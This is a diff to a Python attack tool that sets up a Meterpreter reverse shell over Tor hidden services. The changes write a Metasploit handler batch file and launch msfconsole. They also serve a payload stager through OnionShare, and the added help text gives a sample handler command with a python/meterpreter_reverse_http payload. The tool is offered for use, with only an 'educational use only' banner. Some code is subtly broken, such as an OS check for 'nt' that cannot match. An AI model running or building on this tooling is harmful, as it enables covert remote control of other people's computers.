@@ -1,4 +1,6 @@
 import os
+import shlex
+import sys
 import time
 import subprocess
 import shutil
@@ -46,6 +48,8 @@ def parse_arguments():
         metavar='onion_ftp', default=False,
         help='expects a state change from False to True , then will upload a file using ftp via TOR'
     )
+    parser.add_argument('--example', type=str, required=False,
+                        metavar='example', default=None, help="\n=======\nE.g.\n\t\vpython stemploit.py --exploit exploit/multi/handler --remote-port 80 --local-port 5000 --local-host 127.0.0.1 --payload python/meterpreter_reverse_http")
     return parser.parse_args()
 
 
@@ -69,14 +73,14 @@ def generate_rc_payload(hostname, payload, output):
 
 def generate_msfc_batch(exploit, payload, lhost, lport):
     """Generate metasploit batch .rc file"""
-    with open('msfconsole.rc', 'w') as f:
+    with open(os.getcwd() + '/public/msfconsole.rc', 'w') as f:
         f.write("use %s\n" % exploit)
-        f.write("set PAYLOAD %s\n" % payload)
+        f.write("set PAYLOAD " + os.getcwd() + "/public/%s\n" % payload)
         f.write("set LHOST %s\n" % lhost)
         f.write("set LPORT %d\n" % lport)
         f.write("exploit -jz\n")
 
-    print(" * batch file generated in " + os.getcwd() + "/msfconsole.rc")
+    print(" * batch file generated in " + os.getcwd() + "/public/msfconsole.rc")
     print('\n')
     # Asking for valid response
     while True:
@@ -87,30 +91,26 @@ def generate_msfc_batch(exploit, payload, lhost, lport):
             break
 
     if response == 'yes':
-        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r msfconsole.rc'])
+        subprocess.Popen(['xterm', '-e', 'msfconsole -q -r ' + os.getcwd() + '/public/msfconsole.rc'])
 
 
 def generate_onionshare_stager(outfile):
-    rc = subprocess.call(['which',  'onionshare-cli'], stdout=subprocess.PIPE)
+    onionshare = 'onionshare-cli' if sys.platform == 'nt' else 'onionshare'
+    rc = subprocess.call(['which', onionshare], stdout=subprocess.PIPE)
     if rc:
         print('\n')
-        print('[!] Unable to find onionshare-cli ! Exiting...')
+        print('[!] Unable to find ' + onionshare + ' ! Exiting...')
         exit(0)
     else:
         # Start OnionShare FTP
         print(' * Starting OnionShare solution...')
         # os.system('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % (outfile, ))
-        print('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % outfile)
-        proc = subprocess.Popen(
-            args=['onionshare-cli', outfile, '--public', '--website', '--disable_csp'],
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
-            shell=True
-        )
-        state = proc.communicate(timeout=120)
-        stdout = proc.stderr.read() + proc.stdout.read()
-    # Give some time to start onionshare hidden webservice
-    time.sleep(120)
-
+        if sys.platform == 'nt':
+            print('onionshare-cli %s --public --website --disable_csp --receive --data-dir %s' % outfile)
+            args = shlex.split('onionshare-cli ' + outfile + ' --website --public --disable_csp')
+        else:
+            args = shlex.split('onionshare ' + outfile + ' --website')
+        subprocess.Popen(args)
 
 
 def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost=None, output=None, onion_ftp=False):
@@ -144,7 +144,7 @@ def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost
 
         # Check if onion_ftp is needed
         if onion_ftp:
-            generate_onionshare_stager(os.getcwd() + '/stemploitout')
+            generate_onionshare_stager(os.getcwd() + '/public/px.rdx')
         # The hostname is only available when we can read the hidden service
         # directory. This requires us to be running with the same user as tor process.
         if result.hostname:
@@ -169,6 +169,9 @@ def parameters_handler(exploit=None, payload=None, lport=None, rport=None, lhost
             print(" * Shutting down hidden service and clean it off disk")
             controller.remove_hidden_service(hidden_service_dir)
             shutil.rmtree(hidden_service_dir)
+            print(" * Shutting down onionshare")
+            onion_share = 'onionshare-cli' if sys.platform == 'nt' else 'onionshare'
+            os.kill(int(check_output(["pidof", onion_share])), signal.SIGTERM)
             print(" * Shutting down tor")
             os.kill(int(check_output(["pidof", "tor"])), signal.SIGTERM)
             os.system("service tor stop")
@@ -187,7 +190,7 @@ def stemploit_main():
         \x1b[91m""")
     print(colored("\t\tMeterpreter Reverse shell on TOR using hidden services", 'red'))
     print(colored("\t\tT0x1cEnv31ope@ctemplar.com | For educational use only", 'red'))
-    print(colored("\t\tmany thanks to ~<| calfcrusher |>~", 'yellow'))
+    print(colored("\t\tmany thanks to ~<|", 'yellow') + colored("\x1b[6;30;42m calfcrusher \x1b[0m", 'red') + colored("|>~ ", 'yellow'))
     print('\n')
     time.sleep(2)
     arguments = parse_arguments()
@@ -204,7 +207,7 @@ def stemploit_main():
     except Exception as e:
         print('\n')
         print(colored('\t\v! Error occur !', 'red'))
-        print(colored(e.with_traceback(e.__traceback__), 'yellow'))
+        print(colored(str(e.with_traceback(e.__traceback__)), 'yellow'))
         exit(0)
 
 
